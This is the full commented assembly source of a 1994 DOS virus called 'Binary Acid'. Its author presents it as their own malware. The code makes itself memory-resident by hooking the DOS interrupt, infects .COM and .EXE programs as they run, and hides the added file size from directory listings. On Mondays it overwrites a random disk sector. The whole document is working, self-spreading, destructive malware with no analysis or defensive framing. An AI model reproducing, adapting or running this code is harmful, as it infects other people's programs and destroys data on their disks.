;Binary Acid Virus
;by Evil Avatar
;Another lame virus by me.  Then again, not bad for my second virus!
;This is a resident .COM/.EXE/.OV? infector that infects on file runs.
;It does hide the size change AND avoids CHKDSK and its ilk.
;Plenty more from me to come.  Stay tuned.

.model tiny                             ;if you are lost already, you
.code                                   ;shouldn't be playing with viruses
org 0h

v_mem   equ (v_end-Acid+15)/16+1
v_word  equ (v_end-Acid)/2
id      equ 0a0ffh
v_file  equ (heap-Acid)

Acid:   call next
next:   pop bp
        sub bp, offset next             ;get delta offset

        mov ax, id
        sub bx, bx
        int 21h                         ;residentcy install check

        push es                         ;save PSP segment
        cmp bx, id                      ;are we here already?
        je check                        ;then exit

        mov ax, 3521h
        int 21h                         ;get int 21h vector
        mov word ptr [bp+save_21], bx
        mov word ptr [bp+save_21+2], es ;save int 21h vector

        mov ax, ds                      ;ds=PSP segment
        dec ax                          ;ax=MCB segment
        mov es, ax                      ;es=MCB segment
        cmp byte ptr es:[0], 'Z'        ;is it last MCB in chain?
        jne done                        ;no? exit
        sub word ptr es:[3], v_mem      ;allocate memory for virus
        sub word ptr es:[12h], v_mem    ;change TOM field in PSP
        mov ax, es:[12h]                ;find virus MCB segment
        mov es, ax                      ;es=virus MCB segment
        mov byte ptr es:[0], 'Z'        ;mark as last in MCB chain
        mov word ptr es:[1], 8          ;DOS now owns this
        mov word ptr es:[3], v_mem-1    ;set the size of segment
        inc ax                          ;ax=virus segment
        mov es, ax                      ;es=virus segment
        lea si, [bp+offset Acid]        ;start of virus
        sub di, di                      ;clear di
        mov cx, v_word                  ;virus size in words
        rep movsw                       ;copy virus to TOM

        push es
        pop ds                          ;put segment in ds
        mov ax, 2521h
        mov dx, offset int21
        int 21h                         ;set new int 21h vector in virus

check:  pop es                          ;restore es
        mov ah, 2ah
        int 21h                         ;get date
        cmp al, 1                       ;is it a monday?
        je destroy                      ;chew a sector
return:        
        cmp sp, 0abcdh                  ;is this an .exe file?
        jne done                        ;no? restore com stuff
        push es
        pop ds
        mov ax, es                      ;ax=PSP segment
        add ax, 10h                     ;adjust for PSP size
        add word ptr cs:[bp+comsave+2], ax ;set up cs
        add ax, word ptr cs:[bp+_ss_sp+2]  ;set up ss
        cli                             ;clear ints for stack manipulation
        mov ss, ax                      ;set ss
        mov sp, word ptr [bp+_ss_sp]    ;set sp
        sti                             ;restore ints
        db 0eah                         ;jump to old program
comsave db 0cdh, 20h, 0, 0

destroy:
        in al, 40h
        xchg al, ah
        in al, 40h                      ;get a random number
        xchg ax, dx
        mov cx, 1
        mov ax, 2
        int 26h                         ;and crunch that sector
        jmp return                      ;return to program

done:   push cs
        pop ds                          ;ds=cs
        push cs
        pop es                          ;es=cs

        mov di, 100h                    ;beginning of program
        push di                         ;for later return
        lea si, [bp+comsave]            ;first 3 bytes of program
        movsb
        movsw                           ;restore first 3 bytes

        ret                             ;return to program

int21:  cmp ax, id                      ;is this an installation check?
        je vcheck                       ;yes? tell 'em we're here
        push bx
        push cx
        push si
        push di
        push es
        push dx
        push ds                         ;save regs
        push ax
        cmp ah, 4bh                     ;hmm..execute huh? well, they
        je v_com                        ;did it to themselves
        cmp ah, 11h                     ;dir check
        je dirfix
        cmp ah, 12h                     ;dir check
        je dirfix
        pop ax
        pop ds
        pop dx
intpop: pop es
        pop di
        pop si
        pop cx
        pop bx                          ;restore regs
        jmp dword ptr cs:[save_21]      ;jump to DOS int 21h

vcheck: xchg ax, bx                     ;put ID into bx
        iret

dirfix: pushf
        call dword ptr cs:save_21       ;simulate int 21h call

        mov word ptr cs:[buffer], ax    ;save return
        push ax
        push si
        pushf                           ;save the new flags
        mov si, sp
        mov ax, [si]                    ;get new flags
        mov [si+10], ax                 ;put them where old flags are
        popf
        pop si
        pop ax

        test al, al                     ;see if file is found
        jnz nofile                      ;if none, exit

        mov ah, 51h
        int 21h                         ;get PSP segment
        mov es, bx
        cmp bx, es:[16h]                ;is it DOS?
        jne nofile                      ;no? avoid CHKDSK
        
        mov ah, 2fh
        int 21h                         ;get DTA in es:bx

        cmp byte ptr ds:[bx], -1        ;is it extended FCB?
        jne cont
        add bx, 7                       ;then add 7 to pointer
cont:   mov cx, ds:[bx+17h]             ;get time
        and cx, 1fh                     ;get seconds
        cmp cx, 1fh                     ;if not 62 secs then exit
        jne nofile

        sub ds:[bx+1dh], v_file
        sbb word ptr ds:[bx+1fh], 0     ;subtract virus size
        
nofile: pop ax                          ;if you can read this
        pop ds                          ;you don't need glasses
        pop dx
        pop es
        pop di
        pop si
        pop cx
        pop bx                          ;restore regs
        mov ax, word ptr cs:[buffer]    ;restore return type
        iret

v_com:  push ds
        push dx
        push cs
        pop ds
        mov ax, 3524h
        int 21h                         ;get critical error handler
        mov word ptr [save_24], bx
        mov word ptr [save_24+2], es    ;save it
        mov ax, 2524h
        mov dx, offset int24            
        int 21h                         ;set new critical error handler
        pop dx
        pop ds        
        push cs
        pop es

        mov ax, 4300h
        int 21h                         ;get attributes of file
        push cx                         ;save attributes
        mov ax, 4301h
        sub cx, cx
        int 21h                         ;clear attributes
        jc booster

        mov ax, 3d02h
        int 21h                         ;open file
        xchg ax, bx                     ;put handle in bx

        push cs
        pop ds                          ;ds=cs for all references
        jmp past_booster
booster:                                ;i hate having to use these
        pop cx
        pop ax
        pop ds
        pop dx
        push ax
        jmp bad_file
text    db 'KW'                         ;you'll never guess
past_booster:
        mov ah, 3fh
        mov cx, 1ah
        mov dx, offset buffer
        int 21h                         ;read first 1ah bytes

        mov ax, 5700h
        int 21h                         ;get file time and date
        mov word ptr [time], cx         ;save time
        mov word ptr [date], dx         ;save date
        and cx, 1fh                     ;get seconds
        cmp cx, 1fh                     ;is it 62 secs?
        je close                        ;already infected

        cmp word ptr [buffer], 'ZM'
        je v_exe
        cmp word ptr [buffer], 'MZ'
        je v_exe                        ;if .exe file then infect it

        mov si, offset buffer
        mov di, offset comsave
        movsb
        movsw                           ;move combytes to comsave
        mov ax, 4202h
        sub cx, cx
        cwd
        int 21h                         ;move pointer to EOF

        sub ax, 3
        mov byte ptr [buffer], 0e9h
        mov word ptr [buffer+1], ax     ;set up jump

write_virus:
        mov ah, 40h
        mov cx, v_file
        cwd
        int 21h                         ;write virus to EOF
        mov ax, 4200h
        sub cx, cx
        int 21h                         ;go to beginning of file
        mov ah, 40h
        mov cx, 1ah                     ;restore buffer size
        mov dx, offset buffer
        int 21h                         ;write header or jump

sign:   mov ax, 5701h
        mov cx, word ptr [time]         ;get time
        or cx, 1fh                      ;set seconds to 62
        mov dx, word ptr [date]         ;get date
        int 21h                         ;set file time and date

close:  mov ah, 3eh
        int 21h                         ;close file

        pop cx                          ;get attributes
        pop ax
        pop ds
        pop dx                          ;get file name
        push ax
        mov ax, 4301h
        int 21h                         ;restore attributes
bad_file:        
        push ds
        push dx
        mov ax, 2524h
        lds dx, dword ptr cs:[save_24]
        int 21h                         ;restore old int 24h
        pop dx
        pop ds
        pop ax
        jmp intpop                      ;return to caller

v_exe:  push bx
        les ax, dword ptr [buffer+14h]  ;get cs:ip in es:ax
        mov word ptr [comsave], ax      ;save ip
        mov word ptr [comsave+2], es    ;save cs
        
        les ax, dword ptr [buffer+0eh]  ;get ss:sp
        mov word ptr [_ss_sp], es       ;save sp
        mov word ptr [_ss_sp+2], ax     ;save ss
        
        add word ptr [buffer+0ah], v_mem   ;set new minimum memory requested
        
        mov ax, word ptr [buffer+8]     ;get header size
        mov cl, 10h
        mul cl                          ;change to bytes
        push ax                         ;save it

        mov ax, 4202h
        sub cx, cx
        cwd                             ;move file pointer to EOF
        int 21h                         ;and get file size in dx:ax
        
        pop cx                          ;restore header size
        push dx
        push ax                         ;save file size
        
        sub ax, cx
        sbb dx, 0                       ;get new cs:ip
        
        mov word ptr [buffer+16h], dx   ;save cs
        mov word ptr [buffer+14h], ax   ;save ip
        
        mov word ptr [buffer+0eh], dx   ;save ss
        mov word ptr [buffer+10h], 0abcdh  ;save sp
        
        pop ax
        pop dx                          ;get file size
        add ax, (v_end-Acid)
        adc dx, 0                       ;add virus size
        
        mov cx, 200h                    
        div cx                          ;convert to pages
        push ax                         ;save it
        or dx, dx                       ;is there a remainder?
        je remainder                    ;yes? increment number of pages
        inc ax
remainder:        
        mov word ptr [buffer+4], ax     ;save number of pages
        pop ax
        and ah, 1
        mov word ptr [buffer+2], ax     ;file size MOD 512
        pop bx
        jmp write_virus

int24:  mov al, 3                       ;fail the call
        iret

vname   db '[Binary Acid]', 0           ;do you need this explained???
author  db '(c) 1994 Evil Avatar', 0    ;this is me (duh!)
_ss_sp  dd ?                            ;stack pointer
heap:                                   ;variables
save_21 dd ?                            ;int 21h entry
save_24 dd ?                            ;int 24h entry
time    dw ?                            ;file time
date    dw ?                            ;file date
buffer  db 1ah dup (?)                  ;buffer
v_end:
end Acid
